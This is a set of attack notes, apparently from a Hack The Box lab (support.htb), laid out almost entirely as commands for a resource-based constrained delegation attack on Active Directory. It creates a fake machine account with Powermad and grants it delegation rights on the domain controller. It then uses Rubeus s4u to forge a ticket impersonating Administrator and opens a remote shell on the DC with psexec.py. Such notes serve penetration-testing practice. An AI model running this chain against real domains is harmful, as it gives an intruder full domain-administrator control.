# Active Directory



```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-
MachineAccountQuota
```

```
. ./PowerView.ps1
```

```
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

```
 . ./Powermad.ps1
```



Creating a Computer Object

```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString
'Password123' -AsPlainText -Force)
```

```
Get-ADComputer -identity FAKE-COMP01
```



Configuring RBCD

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

```
 Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

```
 Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

```
$RawBytes = Get-DomainComputer DC -Properties 'msds-
```

```
allowedtoactonbehalfofotheridentity' | select -expand msds-
allowedtoactonbehalfofotheridentity
```

```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
$RawBytes, 0
```

```
$Descriptor
$Descriptor.DiscretionaryAcl
```



Performing a S4U Attack

```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

```
rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71
/impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

```
ticketConverter.py ticket.kirbi ticket.ccache
```

```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
